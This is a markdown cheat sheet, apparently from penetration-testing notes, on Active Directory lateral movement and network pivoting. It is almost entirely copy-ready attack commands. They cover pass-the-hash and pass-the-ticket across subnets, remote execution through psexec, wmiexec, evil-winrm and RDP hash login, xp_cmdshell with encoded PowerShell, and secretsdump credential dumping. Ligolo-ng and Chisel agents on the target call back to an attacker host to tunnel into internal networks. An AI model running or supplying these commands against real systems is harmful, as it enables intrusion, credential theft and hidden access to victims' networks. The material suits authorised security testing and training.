---
title: "Lateral Movement & Network Pivoting"
description: "Pass-the-Hash, pass-the-ticket, remote execution techniques, and pivoting with Ligolo-ng, Chisel, and SOCKS proxies"
tags:
  - Active Directory
  - Lateral Movement
  - Pivoting
  - Pass-the-Hash
  - Tunneling
---

# Lateral Movement & Network Pivoting

---

## 1. Pass-the-Hash / Pass-the-Key / Pass-the-Ticket

```bash
# --- Pass-the-Hash (PtH) with NetExec across the whole subnet ---
nxc smb 10.10.11.0/24 -u administrator -H <NTLM_HASH> --continue-on-success
nxc smb 10.10.11.0/24 -u administrator -H <NTLM_HASH> -x "whoami /all" # Execute on successes
nxc winrm 10.10.11.0/24 -u administrator -H <NTLM_HASH>
# --- Pass-the-Hash with Impacket (multiple execution methods) ---
impacket-psexec -hashes :<NTLM_HASH> '<DOMAIN>/administrator@<TARGET_IP>'
impacket-wmiexec -hashes :<NTLM_HASH> '<DOMAIN>/administrator@<TARGET_IP>'
impacket-smbexec -hashes :<NTLM_HASH> '<DOMAIN>/administrator@<TARGET_IP>'
impacket-atexec -hashes :<NTLM_HASH> '<DOMAIN>/administrator@<TARGET_IP>' 'whoami'
impacket-dcomexec -hashes :<NTLM_HASH> -object MMC20 '<DOMAIN>/administrator@<TARGET_IP>'
# --- Pass-the-Key (AES keys from DCSync / LSA secrets) ---
impacket-getTGT <DOMAIN>/'administrator' -aesKey <AES256> -dc-ip <DC_IP>
export KRB5CCNAME=administrator.ccache
# --- Pass-the-Ticket (reuse an existing .ccache / .kirbi) ---
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass <TARGET_HOST>.<DOMAIN>
# Windows: Rubeus.exe ptt /ticket:<base64>
# --- Overpass-the-Hash (hash -> TGT -> ticket-based auth) ---
impacket-getTGT <DOMAIN>/'<USER>' -hashes :<NTLM_HASH> -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache && klist
nxc smb <TARGET_IP> -k --use-kcache
```

---

## 2. Remote Execution Techniques Comparison

| Technique | Ports | Tool | Admin Required | Notes |
| :--- | :--- | :--- | :--- | :--- |
| **PsExec** | 445 | `impacket-psexec` | Yes | Service creation (`PSEXESVC`) — noisy, leaves binary/event logs |
| **SMBExec** | 445 | `impacket-smbexec` | Yes | No binary upload; uses bat file + service — medium noise |
| **WMIExec** | 135/445 | `impacket-wmiexec` | Yes | Semi-interactive, output via SMB share — good default |
| **AtExec** | 445 | `impacket-atexec` | Yes | Task Scheduler — output limited to file results |
| **DCOMExec** | 135 | `impacket-dcomexec` | Yes | MMC20/ShellWindows/ShellBrowserWindow objects |
| **WinRM** | 5985/5986 | `evil-winrm`, `nxc winrm` | Yes (Remote Mgmt Users) | Clean, encrypted, PowerShell native |
| **RDP** | 3389 | `xfreerdp /pth:` | Yes (RDP users) | Restricted Admin PtH: `/pth:<NTLM_HASH>` |
| **SSH (Win)** | 22 | `ssh` | Yes | If OpenSSH is installed; key or password auth |
| **RDP via RDP hijack** | 3389 | `tscon.exe` | SYSTEM | Hijack another user's session without a password |

```bash
# --- Preferred low-noise chain (WMIExec) ---
nxc smb <TARGET_IP> -u '<USER>' -H <HASH> # 1. Verify admin
impacket-wmiexec -hashes :<HASH> '<DOMAIN>/<USER>@<TARGET_IP>' # 2. Get a semi-shell
# --- WinRM session with evil-winrm (supports upload/download/Pass-the-Hash) ---
evil-winrm -i <TARGET_IP> -u administrator -H <NTLM_HASH>
evil-winrm -i <TARGET_IP> -u '<USER>' -p 'Password123!' -s ./scripts/
# --- RDP Pass-the-Hash (Restricted Admin mode) ---
xfreerdp /v:<TARGET_IP> /u:administrator /pth:<NTLM_HASH> /cert:ignore +clipboard /dynamic-resolution
# --- MSSQL-based lateral movement ---
impacket-mssqlclient '<DOMAIN>/<USER>:Password123!@<SQL_IP>' -windows-auth
# SQL> EXEC xp_cmdshell 'powershell -enc <BASE64>'
# SQL> EXEC sp_addlinkedserver @server='<DC_IP>'
```

---

## 3. Pivoting & Tunneling

=== " Ligolo-ng (Recommended 2026)"

    ```bash
    # --- On the ATTACKER (proxy) ---
    sudo ip tuntap add user $(whoami) mode tun ligolo
    sudo ip link set ligolo up
    ./proxy -selfcert -laddr 0.0.0.0:11601
    # --- On the TARGET (agent) ---
    ./agent -connect <LHOST>:11601 -ignore-cert -k
    # --- In the Ligolo console ---
    session # Select the agent session
    ifconfig # Note the internal network interface
    start # Start the tunnel
    # --- Add the internal route on the attacker and pivot natively! ---
    sudo ip route add 172.16.10.0/24 dev ligolo
    # You can now `nxc smb 172.16.10.5` DIRECTLY — no proxychains needed.
    ```

=== " Chisel (HTTP/WS tunnel over 443)"

    ```bash
    # --- Attacker (server) ---
    ./chisel server --reverse --port 443 --auth user:Pass123 --socks5
    # --- Target (client) -> reverse SOCKS5 back to attacker ---
    ./chisel client https://<LHOST>:443 R:socks --auth user:Pass123
    # --- Use the SOCKS proxy (default chisel socks port = 1080) ---
    cat >> /etc/proxychains4.conf << 'EOF'
    socks5 127.0.0.1 1080
    EOF
    proxychains4 -q nxc smb 172.16.10.5 -u '<USER>' -p 'Password123!'
    proxychains4 -q impacket-secretsdump '<DOMAIN>/<USER>:Password123!@172.16.10.5'
    ```

=== " SSH Dynamic Port Forward / SOCKS"

    ```bash
    # SOCKS5 proxy through a compromised Linux host (first pivot)
    ssh -D 1080 -N -f user@<TARGET_IP>
    ssh -L 3389:172.16.10.5:3389 -N -f user@<TARGET_IP> # Single-port forward
    # Chained pivots (proxy a proxy) with proxychains
    proxychains4 -q curl http://172.16.10.5 --socks5 127.0.0.1:1080
    # sshuttle: transparent VPN over SSH (no proxychains needed)
    sshuttle -r user@<TARGET_IP> 172.16.10.0/24 --ssh-cmd "ssh -i ./id_rsa"
    ```

=== " Other Pivoting Tools"

    ```bash
    # meterpreter autoroute + socks (classic)
    # meterpreter > run autoroute -s 172.16.10.0/24
    # msf6 > use auxiliary/server/socks_proxy
    # sshd pivot without a listener (Windows) — use WinRM netsh portproxy
    netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8080 connectaddress=172.16.10.5
    # socat relay (single port, simple)
    socat TCP-LISTEN:8080,fork TCP:172.16.10.5:80
    # rpivot / gs-netcat / frp — alternatives when chisel is blocked by egress filtering
    ```